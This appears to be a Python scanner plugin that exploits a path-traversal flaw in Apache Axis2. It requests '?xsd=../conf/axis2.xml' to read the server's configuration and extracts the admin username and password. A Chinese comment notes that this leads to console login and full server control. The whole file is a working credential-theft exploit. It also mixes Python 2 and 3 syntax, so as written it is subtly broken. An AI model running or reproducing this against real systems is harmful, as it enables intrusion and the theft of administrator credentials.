# coding:utf-8
import re
import urllib.request as ur 

#通过此漏洞可以读取配置文件等信息，进而登陆控制台，通过部署功能可直接获取服务器权限
def check(url, timeout):
    try:
        res = ur.urlopen(url + '/axis2/services/listServices', timeout=timeout)
        res_code = res.code
        res_html = res.read()
        if int(res_code) == 404: return
        m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', res_html)
        if m.group(1):
            server_str = m.group(1)
            read_url = url + '/axis2/services/%s?xsd=../conf/axis2.xml' % (server_str)
            res = ur.urlopen(read_url, timeout=timeout)
            res_html = res.read()
            if 'axisconfig' in res_html:
                user = re.search('<parameter name="userName">(.*?)</parameter>', res_html)
                password = re.search('<parameter name="password">(.*?)</parameter>', res_html)
                info = u'%s 存在任意文件读取漏洞 %s:%s' % (read_url, user.group(1), password.group(1))
                return info
    except Exception, e:
        pass
